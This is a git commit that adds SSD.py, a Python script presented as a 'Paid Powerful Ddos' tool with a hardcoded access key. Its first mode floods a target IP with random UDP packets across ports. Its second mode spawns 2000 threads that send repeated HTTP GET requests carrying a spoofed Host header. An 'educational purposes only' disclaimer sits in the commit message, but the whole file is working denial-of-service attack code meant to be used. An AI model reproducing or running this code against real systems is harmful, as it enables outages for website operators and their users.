469e34adde52d0794564826d474005d073c1d308
nhprince <167636422+nhprince@users.noreply.github.com>
2024-09-25 16:18:32 +0600

    Add files via upload
    This a web penetration testing script to perform a DDOS attack. Don't use this tool to harm any website. This tool is only for educational purposes. The developer of this tool is not responsible for any kind of misuse of this tool. Unauthorized copying is strictly prohibited 🚫.

---
+++ SSD.py
@@ -0,0 +1,212 @@
+import sys
+import os
+import time
+import socket
+import threading
+import random
+import datetime
+
+from datetime import datetime
+from os import system
+os.system('clear')
+#banner start
+print("""\033[33;1m
+   __________                                                                               
+  / ___/ ___/                                                                               
+  \__ \\__ \                                                                                
+ ___/ /__/ /                                                                                
+/____/____/   __              __             _   ____  __   ____       _                    
+   / __ \____/ /___  _____   / /_  __  __   / | / / / / /  / __ \_____(_)___  ________      
+  / / / / __  / __ \/ ___/  / __ \/ / / /  /  |/ / /_/ /  / /_/ / ___/ / __ \/ ___/ _ \     
+ / /_/ / /_/ / /_/ (__  )  / /_/ / /_/ /  / /|  / __  /  / ____/ /  / / / / / /__/  __/     
+/_____/\__,_/\____/____/  /_.___/\__, /  /_/ |_/_/ /_/  /_/   /_/  /_/_/ /_/\___/\___/      
+                                /____/                                                      
+
+""")
+                                                                            
+print("""\033[38;5;46mAuthor ::: NH Prince""")
+print(""" \033[31;1mGithub ::: hidden""")
+print("""\033[33;1mFacebook ::: NH PRINCE""")
+print("""\033[34;1mTool name:::Paid Powerful Ddos""")
+print("""\033[37;1mTool version::: 4.0""")
+print("""\033[38;5;46mTo start attack you need target website's ip address!!""")
+print("""\x1b[38;5;196mTo get ip address paste target link to checkhost.net""")
+print("""\033[33;1m---------------------------------------------------------------------""")
+print("""\033[38;5;46m_____________________________________________________________________""")
+#_________[ LOGIN KEY ]______>>
+CorrectUsername = 'NST'
+key = 'true'
+while key == 'true':
+    username = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
+    if username == CorrectUsername:
+            print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[0;97m[•]\033[1;32m LOGGED IN PAID TOOL SUCCESSFULLY') 
+            time.sleep(1)
+            os.system('clear')
+            key = 'false'
+#───────────────SECURITY_1-END───────────────#
+#__________________Main menu___________#
+print("""\x1b[38;5;196m
+   __________                                                                               
+  / ___/ ___/                                                                               
+  \__ \\__ \                                                                                
+ ___/ /__/ /                                                                                
+/____/____/   __              __             _   ____  __   ____       _                    
+   / __ \____/ /___  _____   / /_  __  __   / | / / / / /  / __ \_____(_)___  ________      
+  / / / / __  / __ \/ ___/  / __ \/ / / /  /  |/ / /_/ /  / /_/ / ___/ / __ \/ ___/ _ \     
+ / /_/ / /_/ / /_/ (__  )  / /_/ / /_/ /  / /|  / __  /  / ____/ /  / / / / / /__/  __/     
+/_____/\__,_/\____/____/  /_.___/\__, /  /_/ |_/_/ /_/  /_/   /_/  /_/_/ /_/\___/\___/      
+                                /____/                                                      
+
+""")
+NAME=input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m YOUR NAME \033[1;91m: \033[1;35m')
+print(NAME)
+os.system('clear')
+logo="""\033[34;1m
+   __________                                                                               
+  / ___/ ___/                                                                               
+  \__ \\__ \                                                                                
+ ___/ /__/ /                                                                                
+/____/____/   __              __             _   ____  __   ____       _                    
+   / __ \____/ /___  _____   / /_  __  __   / | / / / / /  / __ \_____(_)___  ________      
+  / / / / __  / __ \/ ___/  / __ \/ / / /  /  |/ / /_/ /  / /_/ / ___/ / __ \/ ___/ _ \     
+ / /_/ / /_/ / /_/ (__  )  / /_/ / /_/ /  / /|  / __  /  / ____/ /  / / / / / /__/  __/     
+/_____/\__,_/\____/____/  /_.___/\__, /  /_/ |_/_/ /_/  /_/   /_/  /_/_/ /_/\___/\___/      
+                                /____/                                                      
+
+"""
+print(logo)
+                                                                            
+print("""\033[38;5;46mAuthor ::: NH Prince""")
+print(""" \033[31;1mGithub ::: hidden""")
+print("""\033[33;1mFacebook ::: NH PRINCE""")
+print("""\033[34;1mTool name:::Paid Powerful Ddos""")
+print("""\033[37;1mTool version::: 4.0""")
+print("\033[38;5;46mYour Name :::",NAME)
+print("""\033[38;5;46mTo start attack you need target website's ip address!!""")
+print("""\x1b[38;5;196mTo get ip address paste target link to checkhost.net""")
+print("""\033[38;5;46mPress ctrl+Z to stop the attack""")
+print("""do not use zeroes on your choice ❌""")
+print("""\033[33;1m---------------------------------------------------------------------""")
+print("""1] Method 1(Psycho mode)""")
+print("""2] Method 2(King mode)""")
+print("""\033[38;5;46m_____________________________________________________________________""")
+My_input= input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
+os.system('clear')
+if My_input =='1':
+ now = datetime.now()
+ hour = now.hour
+ minute = now.minute
+ year = now.year
+ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ bytes = random._urandom(1490)
+ bytes = random._urandom(1490)
+ print(logo)
+ print("""\033[38;5;46mAuthor ::: NH Prince""")
+ print(""" \033[31;1mGithub ::: hidden""")
+ print("""\033[33;1mFacebook ::: NH PRINCE""")
+ print("""\033[34;1mTool name:::Paid Powerful Ddos""")
+ print("""\033[37;1mTool version::: 4.0""")
+ print("\033[38;5;46mYour Name :::",NAME)
+ print('''Tool mode:psycho''')
+ print("""\033[38;5;46mTo start attack you need target website's ip address!!""")
+ print("""\x1b[38;5;196mTo get ip address paste target link to checkhost.net""")
+ print("""\033[38;5;46mPress ctrl+Z to stop the attack""")
+ print("""\033[33;1m---------------------------------------------------------------------""")
+ print
+ ip = input("[*]Enter Target ip: ")
+ port = int(input("[*] Enter port :"))
+
+ time.sleep(3)
+ print("[________Starting Attack:: Please wait")
+ time.sleep(4)
+ print("[  Status::-------------> ] 56%")
+ time.sleep(5)
+ print("[  Status::-------------> ] 60%")
+ print("[  Status::-------------> ] 65%")
+ time.sleep(6)
+ print("[  Status::-------------> ] 98%")
+ print("[Attack Started successfully!!]")
+ time.sleep(5)
+ send = 0
+ sent = 0
+ try:
+    while True:
+    	sock.sendto(bytes, (ip, port))
+    	sent = sent+1
+    	port = port+ 1
+    	print("sent %d packets to %s through port %d." % (sent, ip, port))
+    	if port == 65535:
+    		port = 6553
+ except KeyboardInterrupt:
+    print("\n[*] User interrupted the attack.")
+    sys.exit()
+ except socket.gaierror:
+    print("\n[*] Hostname could not be resolved.")
+    sys.exit()
+ except socket.error as e:
+    print(f"\n[*] Could not connect to server: {e}")
+    sys.exit()
+ except:
+        print('An error has occured')
+        sys.exit()
+  
+  
+elif My_input =='2':
+ import socket
+ import threading
+ import random
+ import os
+
+ def get_user_input():
+    os.system("clear")
+    print(logo)
+    print("""\033[38;5;46mAuthor ::: NH Prince""")
+    print(""" \033[31;1mGithub ::: hidden""")
+    print("""\033[33;1mFacebook ::: NH PRINCE""")
+    print("""\033[34;1mTool name:::Paid Powerful Ddos""")
+    print("""\033[37;1mTool version::: 4.0""")
+    print("\033[38;5;46mYour Name :::",NAME)
+    print('''Tool mode:King 👑''')
+    print("""\033[38;5;46mTo start attack you need target website's ip address!!""")
+    print("""\x1b[38;5;196mTo get ip address paste target link to checkhost.net""")
+    print("""\033[38;5;46mPress ctrl+Z to stop the attack""")
+    print("""\033[33;1m---------------------------------------------------------------------""")
+    
+    
+     
+    
+    target_ip = input("Enter the target IP: ")
+    target_port = int(input("Enter the target port: "))
+    fake_ip = input("Enter a fake IP: ")
+    return target_ip, target_port, fake_ip
+
+ requests_sent = 0
+
+ def attack(target_ip, target_port, fake_ip):
+    global requests_sent
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((target_ip, target_port))
+            headers = f"GET /{target_ip} HTTP/1.1\r\n"
+            headers += f"Host: {fake_ip}\r\n"
+            headers += f"User-Agent: {random.choice(['Mozilla/5.0', 'Android/7.0', 'Chrome/80.0.3987.87'])}\r\n"
+            headers += "Accept-language: en-US,en;q=0.9\r\n\r\n"
+            s.sendto(headers.encode("ascii"), (target_ip, target_port))
+            s.close()
+            requests_sent += 1
+            print(f"Requests Sent: {requests_sent}")
+        except:
+            pass
+
+# Get user input, initiate the supersonic attack, and keep countin'
+ target_ip, target_port, fake_ip = get_user_input()
+ for _ in range(2000):
+    thread = threading.Thread(target=attack, args=(target_ip, target_port, fake_ip))
+    thread.start()
+ 
+ 
+ 
+else:
+ print("""Wrong choice ❌""")
